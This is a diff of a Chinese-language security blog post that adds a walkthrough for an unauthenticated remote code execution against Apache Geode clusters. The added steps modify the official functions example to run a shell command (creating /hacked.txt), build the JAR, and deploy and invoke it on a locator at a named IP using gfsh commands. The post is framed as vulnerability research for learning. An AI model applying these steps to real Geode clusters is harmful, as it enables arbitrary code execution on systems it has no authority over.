@@ -5,8 +5,6 @@ published: true
 
 这段时间笔者审计在此之前遇到的一个 Apache 中间件 Apache Geode，并且会在这里实时开源自己新鲜审计出来的漏洞链 和 已经审计出来的 RCE 漏洞，供读者学习  
 
-如果有人利用笔者的思路/漏洞链继续审出来RCE也没关系，这篇文章提到的漏洞链都是完全开放的，把洞卖了能分点钱给我就行(bushi).  
-
 注意，本篇文章不遵循 CC 协议，其内容均为 leeya_bug 所有，禁止转载
 
 <table style="border:1px solid #2bbc8a;border-collapse: collapse;" border="1">
@@ -61,7 +59,7 @@ published: true
 | [AGVL-01漏洞: Apache Geode 反序列化 RCE 漏洞(基于漏洞链2)](#漏洞agvl-01) |
 | [漏洞链 3: 构造恶意 JAR ](#漏洞链-3) |
 | [AGVL-02漏洞: Apache Geode 集群未授权提取 RCE 漏洞(基于漏洞链3)](#漏洞agvl-02) |
-| [一些个人建议](#一些个人建议) |
+| [一些个人意见](#一些个人意见) |
 
 # [](#header-31)Apache Geode介绍
 
@@ -426,26 +424,119 @@ queue.run()
 
 # [](#header-31)漏洞链 3:
 
-我们将利用集群能够上传 JAR 并解析其中的函数的特性，构造 RCE
+接下来将利用集群能够上传 JAR 并解析其中的函数的特性，构造 RCE，首先读者可以阅读一下 Apache Geode 官方文档、笔者以下给出的 Youtube 视频示例，来初步了解下 Apache Geode 的集群函数部署方式及解析特性  
 
-(后面再更新)
+[Deploying Application JARs to Apache Geode Members](https://geode.apache.org/docs/guide/114/configuring/cluster_config/deploying_application_jars.html)
+
+[Youtube 集群函数示例](https://www.youtube.com/watch?v=ZzU3JO0DsTs)
+
+大概意思就是，用户可以通过手动上传一个按照 Geode 部署规则打包的 JAR 包的方式在集群上部署自己的函数，且该函数的必须 implement org.apache.geode.cache.execute.Function 并且实现 execute 和 getId 方法，getId 方法返回值将作为 Function 的唯一标识符  
+
+```java
+public class PrimeNumber implements Function {
+  public static final String ID;
+
+  @Override
+  public String getId() {
+    return "leeya_bug"
+  }
+
+  @Override
+  public void execute(FunctionContext context) {
+
+  }
+}
+```
+`*Function接口的一个实现`
+
+这里笔者想提醒一下各位读者，请千万不要自己构造 JAR 包，若执意自己构造你会发现自己打包的 JAR 包由于各种原因根本无法兼容集群.  
+为了避免部署麻烦直接使用官方 Geode example 来改就行. 接下来笔者也将会用 Geode-example 来为各位读者展示 JAR 包构造流程及 Payload 注入. 首先从 Github 克隆 Geode-example 到本地
+
+```bash
+git clone https://github.com/apache/geode-examples
+```
+
+克隆完毕后，笔者稍微介绍下 geode-examples 必要的项目结构
+
+1. 位于 `geode-examples/functions` 的项目即为示例 JAR 项目  
+
+2. `geode-examples/functions/src/main/java/org/apache/geode_examples/functions/PrimeNumber.java` 中的 PrimeNumber implements Function 类即为集群将会被识别到并且加载的函数类，我们要将 Payload 注入该恶意类中并且将其编译为 JAR 植入集群  
+
+3. `geode-examples/functions/src/main/java/org/apache/geode_examples/functions/Example.java` 中的 main 方法即为我们的客户端入口，客户端将从此处调用集群中的恶意类并在集群上触发命令执行漏洞  
+
+植入 Payload： 
+1. 首先打开 PrimeNumber.java，在 execute 函数的 58 行添加我们的恶意测试 Payload，该 Payload 会在根目录创建个名称为 hacked.txt 的文件以验证命令执行漏洞  
+
+    未植入前
+    ```java
+    public void execute(FunctionContext context) {
+        ...[省略代码]...
+        Collections.sort(primes);
+
+        context.getResultSender().lastResult(primes);
+    }
+    ```
+
+    植入后
+
+    ```java
+    public void execute(FunctionContext context) {
+        ...[省略代码]...
+        Collections.sort(primes);
+
+        try {Runtime.getRuntime().exec("touch /hacked.txt");} catch (Exception e) {throw new RuntimeException(e);}
+
+        context.getResultSender().lastResult(primes);
+    }
+    ```
+
+2. 而后，修改 `Example.java` 中的第 35 行的 IP 地址为远程集群 IP: 172.245.82.84 (这里是我个人 IP，读者请按自己需要修改)
+    ![avatar](/image/2024-06-01-12.png)  
+
+3. 植入完毕后，进入`geode-examples/functions`，输入以下命令启动 gralew 打包:  
+    `../gradlew build`  
+    若提示格式错误，请使用命令 `../gradlew spotlessApply` 来重整格式
+
+4. 打包完毕后，文件 `geode-examples/functions/build/libs/functions.jar` 即为我们即将植入集群的恶意类 JAR
 
 # [](#header-31)漏洞agvl-02:
 # [](#header-31)Apache Geode 集群未授权 RCE 漏洞(基于漏洞链3)
 
-这下我们的受害机器是 172.245.82.84 了，接下来我们
+现在 172.245.82.84 从加害者变成受害人了，我们将刚刚打包完毕的 JAR 部署到 12.245.82.84 中并调用该 JAR 中的恶意 Payload
 
-(后面再更新)
+1. 接下来我们在客户端使用命令 `connect --locator=172.245.82.84[10334]` 连接 172.245.82.84
 
-# [](#header-31)一些个人建议
+    ![avatar](/image/2024-06-01-7.png)  
+
+    连接完毕后，输入以下命令创建 region 并植入 JAR
+
+    `create region --name=example-region --type=REPLICATE`  
+    `describe region --name=example-region`  
+    `deploy --jar={存放路径}/functions.jar`  
+
+    在客户端上输入以上命令时，请完全忽略回显，回显是错误的. 
+
+2. 进入 `geode-examples/functions`，输入以下命令启动客户端调用远程函数  
+
+    `../gradlew run`
+
+    若出现以下回显，则说明一切正常
+
+    ![avatar](/image/2024-06-01-9.png)  
+
+3. 登录集群，发现根目录 `/` 下果然存在文件 `/hacked.txt`，证明攻击者可将 Payload 植入于 JAR 中，将在集群中触发命令执行漏洞  
+
+    ![avatar](/image/2024-06-01-11.png)  
+
+
+# [](#header-31)一些个人意见
 
 在Apache Geode中，有那么一些小特性：
 
 1. Apache Geode 创建的 server、locator 绑定的IP必须与用户在同一子网下，使用穿透、端口映射等方法均完全无法正常访问，同理对于 docker 镜像部署几乎属于 0 支持
 2. 官方文档缺斤少两：无论是中文的文档还是英文的文档，都是缺斤少两. 很多函数调用细节都是笔者猜想出来的，尤其是在 jmx 访问处，笔者
-3. 稳定性极差：
-4. 对于个人用户的支持性极差：几乎只适合企业级场景
-5. 错误处理极为奇葩：笔者在动态调试过程中只收到过一类正确的 Exception，当然是笔者自己忘记 docker 映射端口的原因，后续收到的 Exceptions 几乎都是无脑 throw 底部栈
+3. 对于个人用户的支持性极差：几乎只适合企业级场景，在低于 2G 内存下部署将会自动崩溃
+4. 错误处理极为奇葩：笔者在动态调试过程中只收到过一类正确的 Exception，当然是笔者自己忘记 docker 映射端口的原因，后续收到的 Exceptions 几乎都是无脑 throw 底部栈
 
 笔者对开发者的一些建议：  
 
@@ -455,5 +546,7 @@ queue.run()
 
 1. Apache Geode 部署流程较为棘手，搞坏了我两台服务器真机(不包括 docker)的配置环境
 2. 笔者学业繁忙，如果想要达到 100% 复现率，需要花半把个月时间将整个 Geode 协议吃透，而本篇文章仅为学习用途，因此无任何深入研究  Geode 协议并将其利益化的必要
+
+如果有人利用笔者的思路/漏洞链继续审出来RCE也没关系，这篇文章提到的漏洞链都是完全开放的，把洞卖了能分点钱给我就行(bushi).  
 
 总之如果有想部署复现、学习的读者可以联系笔者参考，有想拿去交 CVE 的就交吧就当笔者送你的
